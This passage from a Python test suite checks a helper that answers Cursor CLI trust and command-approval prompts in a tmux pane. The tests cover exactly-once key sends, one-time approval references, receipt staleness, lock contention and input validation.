CURSOR_COMPOSER = "\u2192 Plan, search, build anything"
ANSWERED_SCREEN = TRUST_TIP + boxed(ANSWERED_BOX_ROWS) + "\n" * 3 + "  Cursor Agent\n" + CURSOR_COMPOSER
if len(ANSWERED_SCREEN.splitlines()) != 24:
    raise AssertionError("ANSWERED_SCREEN is no longer a 24-row pane")
# The frozen live G1 screen (OP399 SK3, 2026-11-05T18:21Z, Cursor UI chrome only): tmux 3.3a,
# a 24x80 pane under 11 history rows, the answered box across history and the visible screen.
# Its worktree, task name, owner marker and pid are synthetic values of the same length.
# Cursor's command-approval prompt on the G1 pane (2026-11-05T19:30:52Z), anonymized: not a box,
# directly under a full-width divider, choices written as (key). 38 history rows, a 24x80 pane.
COMMAND = json.loads((Path(__file__).with_name("cursor-interactive-session-fixtures") / "g1-command-approval.json")
                     .read_text(encoding="utf-8"))
COMMAND_ROWS = COMMAND["capture"].split("\n")
REVIEW_FOOTER = json.loads((Path(__file__).with_name("cursor-interactive-session-fixtures") /
                           "command-approval-review-footer.json").read_text(encoding="utf-8"))
REVIEW_FOOTER_ROWS = REVIEW_FOOTER["capture"].split("\n")
REVIEW_ERROR = json.loads((Path(__file__).with_name("cursor-interactive-session-fixtures") /
                          "command-approval-review-footer-error.json").read_text(encoding="utf-8"))
REVIEW_ERROR_ROWS = REVIEW_ERROR["capture"].split("\n")
# The same prompt with three approvals queued (2026-11-05T20:36:55Z, Cursor CLI 2026.10.14-0f9edde),
# anonymized: "Approval 1 of 3" under the divider and "←/→ to switch approval" after the Skip row.
QUEUE = json.loads((Path(__file__).with_name("cursor-interactive-session-fixtures") / "g1-command-approval-queue.json")
                   .read_text(encoding="utf-8"))
QUEUE_ROWS = QUEUE["capture"].split("\n")
# The same queue after the agent turn ended (2026-11-05T21:41:47Z): two stale duplicate decisions
# ("Approval 1 of 2") with Cursor's "Agent stopped retrying" footer under the prompt.
ABORTED = json.loads((Path(__file__).with_name("cursor-interactive-session-fixtures") / "g1-command-approval-aborted.json")
                     .read_text(encoding="utf-8"))
ABORTED_ROWS = ABORTED["capture"].split("\n")
LIVE = json.loads((Path(__file__).with_name("cursor-interactive-session-fixtures") / "g1-live-capture.json")
                  .read_text(encoding="utf-8"))
# The ledger fields every helper before format 2 wrote for a trust answer (5bf24fec and
# earlier, 8326e2d2 among them).
OLD_LEDGER_FIELDS = ("answered_at", "approval_ref", "kind", "choice", "expected_text_sha256", "pane_id",
                     "pane_pid", "owner", "outcome", "trust_path", "name")


class AnswerFixture(unittest.TestCase):
    """Reuses the fake tmux fixture without re-running the reply tests."""


for _name in ("setUp", "invoke", "calls", "commands", "start_and_inspect", "send_barrier", "await_send"):
    setattr(AnswerFixture, _name, CursorInteractiveTests.__dict__[_name])


class AnswerTests(AnswerFixture):
    """The answer command: one approved, specific prompt choice under the helper lock."""

    def setUp(self):
        super().setUp()
        # A trust answer names its worktree exactly, so use a path the helper can name.
        self.repo = self.root / "example-task"
        self.repo.mkdir()
        self.worktree = str(self.repo.resolve())
        self.env["FAKE_WORKTREE"] = self.worktree
        self.expect_path = self.root / "expect"
        self.expect_path.write_text(self.fix(TRUST_EXPECT))
        self.screen(TRUST_SCREEN)

    def fix(self, text):
        return text.replace(EXAMPLE_PATH, self.worktree)

    def screen(self, capture, visible=None, cursor=None, history=None):
        """Write a capture. The last `visible` rows are the pane (default: all rows).

        tmux reports the rows above the pane as history (default: all of them)."""
        capture = self.fix(capture)
        self.capture.write_text(capture)
        # A new screen: no typed or stale composer text left from an earlier send.
        for typed in (".echo", ".stale"):
            Path(str(self.capture) + typed).unlink(missing_ok=True)
        rows = len(capture.splitlines())
        height = rows if visible is None else visible
        self.env["FAKE_HEIGHT"] = str(height)
        self.env["FAKE_CURSOR_Y"] = str(height - 1 if cursor is None else cursor)
        self.env["FAKE_HISTORY"] = str(max(0, rows - height) if history is None else history)

    def state(self, name=None):
        return json.loads((self.root / "state" / "cursor-interactive-session" / (name or self.name)).read_text())

    def ledger(self, approval=APPROVAL):
        digest = __import__("hashlib").sha256(approval.encode("utf-8")).hexdigest()
        return self.root / "state" / "cursor-interactive-session" / "approvals" / digest

    def answer_args(self, receipt, choice="a", kind="modal-trust", approval=APPROVAL, expect=None,
                    trust=DEFAULT_TRUST):
        args = ["--receipt", receipt, "--approval-ref", approval, "--expect-kind", kind,
                "--expect-text-file", str(expect or self.expect_path), "--choice", choice]
        if trust is DEFAULT_TRUST:
            trust = self.worktree if kind == "modal-trust" else None
        return args + ([] if trust is None else ["--trust-path", trust])

    def namespace(self, receipt):
        return argparse.Namespace(name=self.name, tmux=self.tmux, receipt=receipt,
                                  approval_ref=APPROVAL, expect_kind="modal-trust",
                                  expect_text_file=str(self.expect_path), choice="a",
                                  trust_path=self.worktree)

    def sends(self):
        return [args for args in self.commands("tmux") if args[0] == "send-keys"]

    def inspect_now(self):
        code, inspected = self.invoke("inspect")
        self.assertEqual((code, inspected["state"]), (0, "inspected"))
        return inspected

    def restart_case(self):
        self.log.unlink(missing_ok=True)
        (self.root / "state" / "cursor-interactive-session" / self.name).unlink(missing_ok=True)

    def test_answer_sends_exactly_one_key_and_records_it(self):
        inspected = self.start_and_inspect()
        self.assertEqual(inspected["classification"], "modal-trust")
        code, answered = self.invoke("answer", self.answer_args(inspected["receipt"]))
        self.assertEqual((code, answered["state"]), (0, "answered"))
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "-l", "--", "a"]])
        self.assertEqual((answered["choice"], answered["kind"], answered["approval_ref"]),
                         ("a", "modal-trust", APPROVAL))
        record = self.state()["answers"][-1]
        self.assertEqual({key: record[key] for key in ("approval_ref", "kind", "choice", "pane_id", "pane_pid", "outcome")},
                         {"approval_ref": APPROVAL, "kind": "modal-trust", "choice": "a",
                          "pane_id": "%7", "pane_pid": "123", "outcome": "sent"})
        self.assertRegex(record["answered_at"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$")
        self.assertEqual(record["expected_text_sha256"],
                         __import__("hashlib").sha256(self.fix(TRUST_EXPECT).encode("utf-8")).hexdigest())
        # The trust path is recorded with the approval reference.
        self.assertEqual(record["trust_path"], self.worktree)
        self.assertEqual(json.loads(self.ledger().read_text())["trust_path"], self.worktree)
        self.assertEqual(self.state()["receipt_id"], "")
        self.assertNotIn("Do you trust", json.dumps(answered))
        code, again = self.invoke("answer", self.answer_args(inspected["receipt"]))
        self.assertIn((code, again["state"]), {(2, "stale-receipt"), (2, "approval-spent")})
        # The receipt is spent too: another approval cannot reuse it.
        code, reused = self.invoke("answer", self.answer_args(inspected["receipt"], approval=SECOND_APPROVAL))
        self.assertEqual((code, reused["state"]), (2, "stale-receipt"))
        self.assertEqual(len(self.sends()), 1)

    def test_answer_refuses_prompt_text_mismatch_without_spending(self):
        inspected = self.start_and_inspect()
        variants = {
            # The expected text must name the trust path, so another path is an input error.
            "other path": (TRUST_EXPECT.replace("example-task", "other-task"), "invalid-input"),
            "missing line": (TRUST_EXPECT + "Allow network access\n", "modal-mismatch"),
            "reordered": ("".join(TRUST_EXPECT.splitlines(True)[i] for i in (1, 0, 2, 3, 4, 5)), "modal-mismatch"),
        }
        for label, (text, expected) in variants.items():
            with self.subTest(label=label):
                expect = self.root / ("expect-" + label.replace(" ", "-"))
                expect.write_text(self.fix(text))
                code, refused = self.invoke("answer", self.answer_args(inspected["receipt"], expect=expect))
                self.assertEqual((code, refused["state"]), (2, expected))
                self.assertEqual(self.sends(), [])
        self.assertNotEqual(self.state()["receipt_id"], "")
        self.assertFalse(self.ledger().exists())
        code, answered = self.invoke("answer", self.answer_args(inspected["receipt"]))
        self.assertEqual((code, answered["state"]), (0, "answered"))

    def test_answer_refuses_kind_mismatch(self):
        cases = (
            (TRUST_SCREEN, TRUST_EXPECT, "a", "modal-approval"),
            ("Allow this command: git push [y] Yes [n] No\n>", "Allow this command: git push [y] Yes\n", "y", "modal-trust"),
            ("Are you sure? [y] Yes\n>", "Are you sure? [y] Yes\n", "y", "modal-approval"),
            ("Permission required to continue [a] Allow\n>", "Permission required to continue [a] Allow\n", "a", "modal-trust"),
        )
        for capture, text, choice, kind in cases:
            with self.subTest(kind=kind, capture=capture[:20]):
                self.restart_case()
                self.screen(capture)
                inspected = self.start_and_inspect()
                expect = self.root / "expect-kind"
                expect.write_text(self.fix(text) + (self.worktree + "\n" if kind == "modal-trust" else ""))
                code, refused = self.invoke("answer", self.answer_args(inspected["receipt"], choice=choice,
                                                                        kind=kind, expect=expect))
                self.assertEqual((code, refused["state"]), (2, "modal-mismatch"))
                self.assertEqual(self.sends(), [])

    def test_answer_refuses_when_no_prompt_is_showing(self):
        cases = {
            "active": ("S8 answered\n>", None),
            "draft": ("S8 answered\n> typed [a] text", None),
            "unclassified": ("S8 answered\n[a] Apply the change", 0),
        }
        for label, (capture, cursor) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(capture, cursor=cursor)
                inspected = self.start_and_inspect()
                expect = self.root / "expect-none"
                expect.write_text(("[a] Apply the change\n" if "Apply" in capture else "[a]\n") + self.worktree + "\n")
                code, refused = self.invoke("answer", self.answer_args(inspected["receipt"], expect=expect))
                self.assertEqual((code, refused["state"]), (2, "no-modal"))
                self.assertEqual(self.sends(), [])

    def test_answer_refuses_stale_receipt_and_changed_pane(self):
        inspected = self.start_and_inspect()
        self.screen(TRUST_SCREEN + "someone typed here\n")
        code, stale = self.invoke("answer", self.answer_args(inspected["receipt"]))
        self.assertEqual((code, stale["state"]), (2, "stale-receipt"))
        self.screen(TRUST_SCREEN)
        newer = self.inspect_now()
        code, rotated = self.invoke("answer", self.answer_args(inspected["receipt"]))
        self.assertEqual((code, rotated["state"]), (2, "stale-receipt"))
        for mode, expected in (("replaced", "pane-replaced"), ("new-pane", "pane-replaced"),
                               ("foreign-command", "pane-replaced"), ("foreign-owner", "not-owned"),
                               ("dead", "pane-dead"), ("gone", "pane-missing"), ("copy-mode", "pane-in-mode")):
            with self.subTest(mode=mode):
                code, refused = self.invoke("answer", self.answer_args(newer["receipt"]), mode=mode)
                self.assertEqual((code, refused["state"]), (2, expected))
        code, missing = self.invoke("answer", ["--name", "missing-task", *self.answer_args(newer["receipt"])])
        self.assertEqual((code, missing["state"]), (2, "not-owned"))
        self.assertEqual(self.sends(), [])
        self.assertFalse(self.ledger().exists())

    def test_answer_validates_input_before_any_tmux_call(self):
        inspected = self.start_and_inspect()
        bad_expect = {
            "empty": b"", "blank": b"\n \n", "control": b"[a] Trust this workspace\x1b[2J\n",
            "not-utf8": b"[a] Trust \xff\xfe\n", "oversize": b"[a] Trust this workspace\n" + b"x" * 4097,
            "too many lines": b"[a] Trust this workspace\n" * 21,
        }
        two_keys = self.root / "expect-two-keys"
        two_keys.write_text("[ab] Trust this workspace\n")
        blank_key = self.root / "expect-blank-key"
        blank_key.write_text("[ ] Trust this workspace\n")
        receipt = inspected["receipt"]

        def args(**options):
            # An approval answer, so the trust-path rule cannot mask the rule under test.
            options.setdefault("kind", "modal-approval")
            return self.answer_args(options.pop("receipt", receipt), **options)

        cases = [
            ("approval empty", args(approval="")),
            ("approval short", args(approval="tom-ok")),
            ("approval spaces", args(approval="Tom approved it")),
            ("approval long", args(approval="a" * 201)),
            ("kind unknown", args(kind="modal-unknown")),
            ("kind other", args(kind="active")),
            ("choice empty", args(choice="")),
            ("choice two", args(choice="ab", expect=two_keys)),
            ("choice space", args(choice=" ", expect=blank_key)),
            ("choice escape", args(choice="\x1b")),
            ("choice key name", args(choice="Enter")),
            ("choice not offered", args(choice="z")),
            ("choice not bracketed", args(choice="T")),
            ("bad receipt", args(receipt="v1:not-a-receipt")),
            ("missing expect file", args(expect=self.root / "absent")),
        ]
        for label, data in bad_expect.items():
            path = self.root / ("bad-expect-" + label)
            path.write_bytes(data)
            cases.append(("expect " + label, args(expect=path)))
        for label, extra in cases:
            with self.subTest(label=label):
                self.log.write_text("")
                code, refused = self.invoke("answer", extra)
                self.assertEqual((code, refused["state"]), (2, "invalid-input"))
                self.assertEqual(self.commands("tmux"), [])
        self.assertNotEqual(self.state()["receipt_id"], "")

    def test_answer_refuses_when_the_lock_is_held(self):
        inspected = self.start_and_inspect()
        lock = self.root / "state" / "cursor-interactive-session" / (self.name + ".lock")
        descriptor = os.open(lock, os.O_RDWR)
        try:
            helper.fcntl.flock(descriptor, helper.fcntl.LOCK_EX)
            self.log.write_text("")
            code, busy = self.invoke("answer", self.answer_args(inspected["receipt"]))
            self.assertEqual((code, busy["state"]), (2, "lock-busy"))
            self.assertEqual(self.commands("tmux"), [])
        finally:
            os.close(descriptor)
        self.assertFalse(self.ledger().exists())
        code, answered = self.invoke("answer", self.answer_args(inspected["receipt"]))
        self.assertEqual((code, answered["state"]), (0, "answered"))
        self.assertEqual(len(self.sends()), 1)

    def test_bad_receipt_is_refused_before_the_lock(self):
        inspected = self.start_and_inspect()
        lock = self.root / "state" / "cursor-interactive-session" / (self.name + ".lock")
        descriptor = os.open(lock, os.O_RDWR)
        try:
            helper.fcntl.flock(descriptor, helper.fcntl.LOCK_EX)
            self.log.write_text("")
            code, refused = self.invoke("answer", self.answer_args("v1:not-a-receipt"))
            self.assertEqual((code, refused["state"]), (2, "invalid-input"))
            self.assertEqual(self.commands("tmux"), [])
        finally:
            os.close(descriptor)
        self.assertEqual(self.state()["receipt_id"], helper.parse_receipt(inspected["receipt"])["id"])

    def test_concurrent_answers_send_one_key(self):
        inspected = self.start_and_inspect()
        extra = self.answer_args(inspected["receipt"])
        descriptor, gate, barrier = self.send_barrier()
        with ThreadPoolExecutor(max_workers=1) as pool:
            first = pool.submit(self.invoke, "answer", extra, env=barrier)
            self.await_send(descriptor)
            try:
                # The approval is spent durably before the key is sent.
                self.assertEqual(json.loads(self.ledger().read_text())["outcome"], "sending")
                code, second = self.invoke("answer", extra)
                self.assertEqual((code, second["state"]), (2, "lock-busy"))
            finally:
                # Never block here: if the first call already gave up waiting, the gate has no reader.
                try:
                    handle = os.open(gate, os.O_WRONLY | os.O_NONBLOCK)
                except OSError:
                    pass
                else:
                    os.write(handle, b"1")
                    os.close(handle)
            self.assertEqual(first.result(timeout=10)[1]["state"], "answered")
        code, third = self.invoke("answer", extra)
        self.assertIn((code, third["state"]), {(2, "stale-receipt"), (2, "approval-spent")})
        self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "-l", "--", "a"]])

    def test_failed_answer_send_is_uncertain_and_spent(self):
        inspected = self.start_and_inspect()
        code, failed = self.invoke("answer", self.answer_args(inspected["receipt"]), mode="send-fail")
        self.assertEqual((code, failed["state"]), (3, "answer-unconfirmed"))
        self.assertEqual(self.state()["answers"][-1]["outcome"], "uncertain")
        code, retried = self.invoke("answer", self.answer_args(inspected["receipt"]))
        self.assertIn((code, retried["state"]), {(2, "stale-receipt"), (2, "approval-spent")})
        self.assertEqual(len(self.sends()), 1)

    def test_answer_timeout_is_uncertain(self):
        inspected = self.start_and_inspect()
        args = self.namespace(inspected["receipt"])
        original_run = helper.run
        calls = []

        def timeout_send(argv):
            calls.append(argv)
            if argv[1] == "send-keys":
                raise subprocess.TimeoutExpired(argv, 5)
            return original_run(argv)

        with mock.patch.dict(os.environ, self.env), mock.patch.object(helper, "run", timeout_send):
            with self.assertRaises(helper.Refusal) as caught:
                helper.answer_session(args)
        self.assertEqual((caught.exception.state, caught.exception.code), ("answer-unconfirmed", 3))
        self.assertEqual([call for call in calls if call[1] == "send-keys"],
                         [[self.tmux, "send-keys", "-t", "%7", "-l", "--", "a"]])
        self.assertEqual(self.state()["answers"][-1]["outcome"], "uncertain")

    def test_reply_still_refuses_while_answered_prompt_text_remains(self):
        inspected = self.start_and_inspect()
        code, _answered = self.invoke("answer", self.answer_args(inspected["receipt"]))
        self.assertEqual(code, 0)
        after = self.inspect_now()
        self.assertEqual(after["classification"], "modal-trust")
        self.text_path.write_text("continue")
        code, refused = self.invoke("reply", ["--receipt", after["receipt"], "--text-file", str(self.text_path),
                                              "--submit", "--observed-ready"])
        self.assertEqual((code, refused["state"]), (2, "modal-trust"))
        self.assertEqual(len(self.sends()), 1)

    # Inspect and reply classify the visible screen only (OP399 SK3 follow-up, 2026-11-05).
    # After an answer, the old prompt can stay in the history rows above the screen.

    def reply_to(self, receipt, *flags):
        self.text_path.write_text("continue")
        return self.invoke("reply", ["--receipt", receipt, "--text-file", str(self.text_path), *flags])

    def test_prompt_only_in_history_does_not_block_a_reply(self):
        composer = "S8 answered\n>"
        cases = {
            "history within the 80 captured rows": (TRUST_SCREEN + composer, None),
            "history longer than the 80 captured rows": ("older output\n" * 59 + TRUST_SCREEN + composer, 500),
        }
        for label, (capture, history) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(capture, visible=2, history=history)
                inspected = self.start_and_inspect()
                self.assertIn("Trust this workspace", inspected["text"])
                self.assertEqual(inspected["classification"], "active")
                self.assertNotIn("cannot be located", inspected["classification_detail"])
                code, sent = self.reply_to(inspected["receipt"], "--submit")
                self.assertEqual((code, sent["state"], sent["submitted"]), (0, "sent", True))
                self.assertEqual(self.sends(), [["send-keys", "-t", "%7", "-l", "--", "continue"],
                                                ["send-keys", "-t", "%7", "Enter"]])

    def test_prompt_only_in_history_over_another_screen_is_unclassified(self):
        # The 2026-11-05 screen: Cursor's own composer row under the answered prompt.
        # The helper does not know that row, so the screen is unclassified, not a
        # modal: a reply needs --observed-ready, as for any unclassified screen.
        self.screen(TRUST_SCREEN + "S8 answered\n→ Plan, search, build anything", visible=2)
        inspected = self.start_and_inspect()
        self.assertEqual(inspected["classification"], "unclassified")
        code, refused = self.reply_to(inspected["receipt"], "--submit")
        self.assertEqual((code, refused["state"]), (2, "unclassified-ui"))
        self.assertEqual(self.sends(), [])
        code, sent = self.reply_to(inspected["receipt"], "--submit", "--observed-ready")
        self.assertEqual((code, sent["state"], sent["classification"]), (0, "sent", "unclassified"))

    def test_prompt_on_the_visible_screen_still_blocks_a_reply(self):
        older = "older output\n" * 5
        rows = len(TRUST_SCREEN.splitlines())
        nested = boxed(TRUST_BOX_ROWS[:1] + boxed(TRUST_BOX_ROWS).splitlines() + TRUST_BOX_ROWS[:1])
        titled = boxed(TRUST_BOX_ROWS).replace("╭───", "╭─ Note ─", 1)
        cases = {
            "the prompt fills the screen, older output above": (older + TRUST_SCREEN, rows, None, "modal-trust"),
            "an empty composer holds the cursor under the prompt": (
                older + TRUST_CAPTURE + ">", len(TRUST_CAPTURE.splitlines()) + 1, None, "modal-trust"),
            "a prompt taller than the screen, its header in history": (older + TRUST_SCREEN, 8, None, "modal-trust"),
            "the cursor is off the last row": (older + TRUST_SCREEN, rows, 0, "modal-trust"),
            "a prompt in a box inside a box": (older + nested, len(nested.splitlines()), None, "modal-trust"),
            "a prompt in a box with a titled header": (older + titled, len(titled.splitlines()), None, "modal-trust"),
            "a command prompt under an old trust prompt": (
                TRUST_SCREEN + APPROVAL_SCREEN, len(APPROVAL_SCREEN.splitlines()), None, "modal-approval"),
            "a permission prompt over a composer, old trust prompt above": (
                TRUST_SCREEN + "Permission required to continue [a] Allow\n>", 2, None, "modal-permission"),
            "a confirmation over a composer, old trust prompt above": (
                TRUST_SCREEN + "Are you sure? [y] Yes\n>", 2, None, "modal-unknown"),
        }
        for label, (capture, visible, cursor, kind) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(capture, visible=visible, cursor=cursor)
                inspected = self.start_and_inspect()
                self.assertEqual(inspected["classification"], kind)
                self.assertIn("on the visible screen", inspected["classification_detail"])
                code, refused = self.reply_to(inspected["receipt"], "--submit", "--observed-ready")
                self.assertEqual((code, refused["state"]), (2, kind))
                self.assertEqual(self.sends(), [])

    def test_composer_text_off_the_cursor_row_is_not_active(self):
        # Composer-looking transcript rows on the visible screen, under an old prompt in history.
        cases = {
            "a composer-looking row above a plain last row": (TRUST_SCREEN + "> earlier input\nS8 answered", None),
            "an empty composer on the last row, cursor elsewhere": (TRUST_SCREEN + "S8 answered\n>", 0),
            "an empty composer above a blank cursor row": (TRUST_SCREEN + ">\n\n", None),
        }
        for label, (capture, cursor) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(capture, visible=2, cursor=cursor)
                inspected = self.start_and_inspect()
                self.assertEqual(inspected["classification"], "unclassified")
                code, refused = self.reply_to(inspected["receipt"], "--submit")
                self.assertEqual((code, refused["state"]), (2, "unclassified-ui"))
                self.assertEqual(self.sends(), [])

    def test_stale_receipt_and_pane_changes_refuse_under_an_old_prompt(self):
        capture = TRUST_SCREEN + "S8 answered\n>"
        self.screen(capture, visible=2)
        inspected = self.start_and_inspect()
        self.assertEqual(inspected["classification"], "active")
        # The receipt binds the history rows too: a change there alone is stale.
        self.screen(capture.replace("Tip: You can", "Tip: Now you can"), visible=2)
        code, stale = self.reply_to(inspected["receipt"], "--submit")
        self.assertEqual((code, stale["state"]), (2, "stale-receipt"))
        self.screen(capture.replace("S8 answered", "S9 answered"), visible=2)
        code, stale = self.reply_to(inspected["receipt"], "--submit")
        self.assertEqual((code, stale["state"]), (2, "stale-receipt"))
        self.screen(capture, visible=2)
        newer = self.inspect_now()
        code, rotated = self.reply_to(inspected["receipt"], "--submit")
        self.assertEqual((code, rotated["state"]), (2, "stale-receipt"))
        for mode in ("replaced", "new-pane", "foreign-path", "foreign-command", "foreign-session"):
            with self.subTest(mode=mode):
                self.text_path.write_text("continue")
                code, refused = self.invoke("reply", ["--receipt", newer["receipt"], "--text-file",
                                                      str(self.text_path), "--submit"], mode=mode)
                self.assertEqual((code, refused["state"]), (2, "pane-replaced"))
        self.assertEqual(self.sends(), [])

    def test_unlocated_visible_screen_is_never_active(self):
        # Without a located screen the whole capture is classified as before, but a
        # bare composer is unclassified, never active, and any phrase still blocks.
        cases = {
            "history size does not match the capture": ("S8 answered\n>", 2, 3, "unclassified"),
            "fewer rows than the pane": ("S8 answered\n>", 5, None, "unclassified"),
            "the byte cap cut into the screen": ("x" * 9000 + "\n>", None, None, "unclassified"),
            "a prompt anywhere still blocks": (TRUST_SCREEN + "S8 answered\n>", 2, 0, "modal-trust"),
            "a draft anywhere still blocks": ("S8 answered\n> typed draft", 5, None, "user-draft"),
        }
        refusals = {"unclassified": "unclassified-ui", "modal-trust": "modal-trust", "user-draft": "user-draft"}
        for label, (capture, visible, history, expected) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(capture, visible=visible, history=history)
                inspected = self.start_and_inspect()
                self.assertEqual(inspected["classification"], expected)
                self.assertIn("cannot be located", inspected["classification_detail"])
                if expected.startswith("modal-"):
                    self.assertIn("in the captured window", inspected["classification_detail"])
                    self.assertNotIn("on the visible screen", inspected["classification_detail"])
                flags = ("--submit",) if expected == "unclassified" else ("--submit", "--observed-ready")
                code, refused = self.reply_to(inspected["receipt"], *flags)
                self.assertEqual((code, refused["state"]), (2, refusals[expected]))
                self.assertEqual(self.sends(), [])

    def test_draft_above_a_blank_cursor_row_is_refused(self):
        # Review of f517c561: tmux prints a blank row under the composer. The old
        # parsing dropped that row, so this draft was refused; keep refusing it.
        draft = "S8 answered\n> typed draft\n\n"
        cases = {
            "located, no history": (draft, 3, None),
            "located, an old prompt in history": (TRUST_SCREEN + draft, 3, None),
            "located, a one-row pane under the draft": (draft, 1, None),
            "not located: fewer rows than the pane": (draft, 5, None),
            "not located: history size does not match": (draft, 3, 4),
        }
        for label, (capture, visible, history) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(capture, visible=visible, history=history)
                inspected = self.start_and_inspect()
                self.assertEqual(inspected["classification"], "user-draft")
                code, refused = self.reply_to(inspected["receipt"], "--submit", "--observed-ready")
                self.assertEqual((code, refused["state"]), (2, "user-draft"))
                self.assertEqual(self.sends(), [])

    def test_draft_under_a_prompt_in_history_is_refused(self):
        self.screen(TRUST_SCREEN + "S8 answered\n> typed draft", visible=2)
        inspected = self.start_and_inspect()
        self.assertEqual(inspected["classification"], "user-draft")
        code, refused = self.reply_to(inspected["receipt"], "--submit", "--observed-ready")
        self.assertEqual((code, refused["state"]), (2, "user-draft"))
        self.assertEqual(self.sends(), [])

    # Adversarial rules (parent feedback, 2026-11-04). Each was RED against 082170ef.

    def test_one_answer_per_approval_across_receipts_and_tasks(self):
        inspected = self.start_and_inspect()
        code, failed = self.invoke("answer", self.answer_args(inspected["receipt"]), mode="send-fail")
        self.assertEqual((code, failed["state"]), (3, "answer-unconfirmed"))
        entry = json.loads(self.ledger().read_text())
        self.assertEqual({key: entry[key] for key in ("approval_ref", "name", "pane_id", "choice", "outcome")},
                         {"approval_ref": APPROVAL, "name": self.name, "pane_id": "%7", "choice": "a",
                          "outcome": "uncertain"})
        self.assertEqual(self.ledger().stat().st_mode & 0o777, 0o600)
        self.assertEqual(self.ledger().parent.stat().st_mode & 0o777, 0o700)
        self.assertNotIn("Do you trust", self.ledger().read_text())
        # A new inspect with the same prompt still showing gives a new receipt, not a new answer.
        newer = self.inspect_now()
        self.log.write_text("")
        code, spent = self.invoke("answer", self.answer_args(newer["receipt"]))
        self.assertEqual((code, spent["state"]), (2, "approval-spent"))
        self.assertEqual(self.commands("tmux"), [])
        # Another task name (a new session after a restart) cannot reuse the approval either.
        self.name, self.env["FAKE_SESSION"] = "task-unique-2", "task-unique-2"
        other = self.start_and_inspect()
        code, spent_elsewhere = self.invoke("answer", self.answer_args(other["receipt"]))
        self.assertEqual((code, spent_elsewhere["state"]), (2, "approval-spent"))
        self.assertEqual(len(self.sends()), 0)
        self.assertEqual(json.loads(self.ledger().read_text())["outcome"], "uncertain")
        code, fresh = self.invoke("answer", self.answer_args(other["receipt"], approval=SECOND_APPROVAL))
        self.assertEqual((code, fresh["state"]), (0, "answered"))

    def test_reused_approval_after_a_sent_answer_is_refused(self):
        inspected = self.start_and_inspect()
        code, answered = self.invoke("answer", self.answer_args(inspected["receipt"]))
        self.assertEqual((code, answered["state"]), (0, "answered"))
        self.assertEqual(json.loads(self.ledger().read_text())["outcome"], "sent")
        newer = self.inspect_now()
        code, spent = self.invoke("answer", self.answer_args(newer["receipt"]))
        self.assertEqual((code, spent["state"]), (2, "approval-spent"))
        self.assertEqual(len(self.sends()), 1)

    def test_stale_prompt_text_above_the_visible_screen_is_refused(self):
        # After one answer, the old prompt can stay in the captured history while the
        # visible screen (the last pane_height rows) is a normal composer.
        inspected = self.start_and_inspect()
        code, _answered = self.invoke("answer", self.answer_args(inspected["receipt"]))
        self.assertEqual(code, 0)
        self.screen(TRUST_SCREEN + "S8 answered\n>", visible=2)
        newer = self.inspect_now()
        code, refused = self.invoke("answer", self.answer_args(newer["receipt"], approval=SECOND_APPROVAL))
        self.assertEqual((code, refused["state"]), (2, "stale-prompt"))
        self.assertEqual(len(self.sends()), 1)

    def test_active_composer_under_an_old_prompt_is_refused(self):
        rows = len(TRUST_CAPTURE.splitlines())
        cases = {
            "composer is the bottom row": (TRUST_CAPTURE + "> ", None),
            "composer row below, cursor on a blank row": (TRUST_CAPTURE + ">\n\n", rows + 1),
            "cursor on a composer row above the prompt": (">\n" + TRUST_SCREEN, 0),
        }
        for label, (capture, cursor) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(capture, cursor=cursor)
                inspected = self.start_and_inspect()
                code, refused = self.invoke("answer", self.answer_args(inspected["receipt"]))
                self.assertEqual((code, refused["state"]), (2, "stale-prompt"))
                self.assertEqual(self.sends(), [])
        self.assertFalse(self.ledger().exists())

    def test_a_different_current_prompt_is_refused(self):
        approval_box = "  Allow this command: git push origin main [y] Yes [n] No\n\n"
        cases = {
            "old trust in history, approval visible": (TRUST_CAPTURE + approval_box, 2, "modal-mismatch"),
            "two kinds on the visible screen": (TRUST_CAPTURE + approval_box, None, "prompt-unclear"),
            "a new trust prompt for another path": (
                TRUST_CAPTURE + TRUST_SCREEN.replace("example-task", "other-task"),
                len(TRUST_SCREEN.splitlines()), "trust-path-mismatch"),
        }
        for label, (capture, visible, expected) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(capture, visible=visible)
                inspected = self.start_and_inspect()
                code, refused = self.invoke("answer", self.answer_args(inspected["receipt"]))
                self.assertEqual((code, refused["state"]), (2, expected))
                self.assertEqual(self.sends(), [])
        self.assertFalse(self.ledger().exists())

    def test_unestablished_visible_screen_is_refused(self):
        cases = {
            "fewer rows than the pane": (TRUST_SCREEN, len(TRUST_SCREEN.splitlines()) + 5),
            "pane taller than the bounded capture": (("history line\n" * 120) + TRUST_SCREEN, 90),
        }
        for label, (capture, visible) in cases.items():
            with self.subTest(label=label):
                self.restart_case()
                self.screen(capture, visible=visible)
                inspected = self.start_and_inspect()
                code, refused = self.invoke("answer", self.answer_args(inspected["receipt"]))
                self.assertEqual((code, refused["state"]), (2, "prompt-unclear"))
                self.assertEqual(self.sends(), [])

    def test_spend_approval_is_exclusive(self):
        path = self.root / "ledger-unit" / "approvals" / "entry"
        helper.spend_approval(path, {"approval_ref": APPROVAL})
        with self.assertRaises(helper.Refusal) as caught:
            helper.spend_approval(path, {"approval_ref": APPROVAL})
        self.assertEqual(caught.exception.state, "approval-spent")
        self.assertEqual(json.loads(path.read_text()), {"approval_ref": APPROVAL})
        self.assertEqual(path.stat().st_mode & 0o777, 0o600)

    def test_pane_change_between_spend_and_send_sends_nothing(self):
        # QA round 1 (SK3): the key must not land on whatever replaced the prompt
        # while the approval and receipt were being written.
        changes = {
            "a composer replaced the prompt": {"capture": "S8 answered\n>"},
            "a new prompt with another path": {"capture": TRUST_SCREEN.replace("example-task", "other-task")},
            "the pane process was replaced": {"env": {"FAKE_PID": "999"}},
            # The prompt is still current, but the screen is not the one that was verified.
            "another row changed while the prompt stayed": {"capture": TRUST_SCREEN.replace("Tip: You can", "Tip: Now you can")},
        }
        for label, change in changes.items():
            with self.subTest(label=label):
                self.restart_case()
